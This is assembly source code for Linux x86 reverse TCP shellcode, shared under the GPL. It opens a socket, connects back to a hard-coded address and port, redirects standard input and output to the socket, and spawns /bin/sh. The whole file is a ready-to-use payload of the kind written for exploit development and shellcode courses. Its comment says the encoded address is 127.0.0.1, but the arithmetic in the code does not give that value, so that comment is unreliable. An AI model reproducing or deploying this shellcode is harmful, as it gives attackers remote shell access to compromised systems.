; Reverse TCP Shellcode
; Copyright 2018, Luca Di Domenico
;
;	This program is free software: you can redistribute it and/or modify
; it under the terms of the GNU General Public License as published by
; the Free Software Foundation, either version 3 of the License, or
; (at your option) any later version.
;
; This program is distributed in the hope that it will be useful,
; but WITHOUT ANY WARRANTY; without even the implied warranty of
; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
; GNU General Public License for more details.
;
; You should have received a copy of the GNU General Public License
; along with this program.  If not, see <http://www.gnu.org/licenses/>.


global _start

section .text
_start:
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx

; socket()

	push eax			; protocol = 0
	mov al, 0x66
	mov bl, 0x1
	mov cl, 0x2
	push ebx			; type = SOCK_STREAM
	push ecx			; domain = AF_INET
	lea ecx, [esp]
	int 0x80			; socketcall ( SYS_SOCKET, args = ecx )
	
; connect

	pop ebx				; ebx = AF_INET
	mov ecx, 0x1000007f	; 127.0.0.1 xored with 0xffffffff in network-byte order
	xor ecx, 0xffffffff
	mov dl, 0x10
	push ecx
	push word 0xb315
	push word bx
	mov ecx, esp
	push edx
	push ecx
	push eax
	xor eax, eax
	mov al, 0x66
	inc ebx
	mov ecx, esp
	int 0x80
	xchg ebx, ecx
	pop ebx
	dec ecx

_dup2_loop:

	mov al, 0x3f
	int 0x80
	dec ecx
	jns _dup2_loop

; execve()

	xor ecx, ecx
	push ecx     ; 0x00 
	push 0x68732f2f	; hs//
	push 0x6e69622f	; nib/
	mov al, 0xb
	mov ebx, esp
	mov edx, ecx
	int 0x80 			; execve ("/bin/sh", NULL, NULL)	
